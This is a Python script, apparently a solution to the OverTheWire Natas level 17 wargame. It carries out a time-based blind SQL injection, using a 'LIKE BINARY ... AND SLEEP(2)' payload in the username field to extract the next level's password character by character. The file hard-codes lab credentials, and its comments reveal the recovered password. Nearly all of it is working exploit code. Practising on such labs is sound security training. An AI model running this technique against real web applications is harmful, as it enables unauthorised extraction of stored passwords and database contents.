#!/usr/bin/env python

import requests
from time import time

username = "natas17"
password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"

url = "http://%s.natas.labs.overthewire.org/index.php?debug" % username
session = requests.Session()

# response = session.get(url, auth=(username,password))

# those are the valid letters in each password
letters = "0123456789"
for x in range(65, 91):
    letters += chr(x)
for x in range(97, 123):
    letters += chr(x)

pass_length = len(password)
passwd = ""

for i in range(pass_length):
    for char in letters:
        start = time()
        sqli = (
            'natas18" AND password LIKE BINARY "' + passwd + char + '%" AND SLEEP(2) #'
        )
        post_data = {"username": sqli}
        response = session.post(url, data=post_data, auth=(username, password))
        content = response.text
        end = time()
        if end - start > 1:
            passwd += char
            break
    print(passwd)

# content = response.text
# soup = BeautifulSoup(content,"html.parser").prettify()
# print (soup)

# by going to source page /index-source.html
# we can easily find the following:
# dbname = natas17, tablename = users and it has
# two columns username and password
#
# and also inorder to execute the query we go to /index.php?debug
# we can see the difference between this challenge and nata15 challenge in our
# ability to see if the user with that cirtain password exists or not through
# a message from the server side, but the here is that we still able to run sql
# commands, so why not try the sql injection - time blind attack concept?!
# and after some time we correctlly got the password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
#
# the print statement that is in the for loop can help us
# to determine when we got a wrong when we got a wrong combination of letters
# if that happened we can resume the operation from that point but with changing
# our conditions to get better results
